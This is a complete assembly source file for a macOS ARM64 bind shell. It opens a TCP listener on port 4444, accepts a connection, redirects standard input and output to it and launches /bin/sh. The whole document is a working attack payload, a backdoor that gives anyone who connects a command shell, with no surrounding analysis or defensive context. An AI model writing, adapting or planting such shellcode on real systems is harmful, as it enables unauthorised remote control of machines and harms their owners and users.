; macOS ARM64 bind TCP shell
; Listens on port 4444

.global _start

_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov  x0, #2
    mov  x1, #1
    mov  x2, #0
    mov  x16, #97           ; SYS_socket
    svc  0x80
    mov  x19, x0            ; save fd

    ; bind
    sub  sp, sp, #16
    mov  w0, #0x0200        ; {AF_INET, 0}
    movk w0, #0x5c11, lsl #16 ; port 4444 BE
    str  w0, [sp]
    mov  x0, x19
    mov  x1, sp
    mov  x2, #16
    mov  x16, #104          ; SYS_bind
    svc  0x80

    ; listen(s, 1)
    mov  x0, x19
    mov  x1, #1
    mov  x16, #106          ; SYS_listen
    svc  0x80

    ; accept
    mov  x0, x19
    mov  x1, #0
    mov  x2, #0
    mov  x16, #30           ; SYS_accept
    svc  0x80
    mov  x20, x0

    ; dup2(client, 0/1/2)
    mov  x1, #2
.loop:
    mov  x0, x20
    mov  x16, #90           ; SYS_dup2
    svc  0x80
    subs x1, x1, #1
    b.ge .loop

    ; execve /bin/sh
    adr  x0, sh
    mov  x1, #0
    mov  x2, #0
    mov  x16, #59           ; SYS_execve
    svc  0x80

sh: .asciz "/bin/sh"
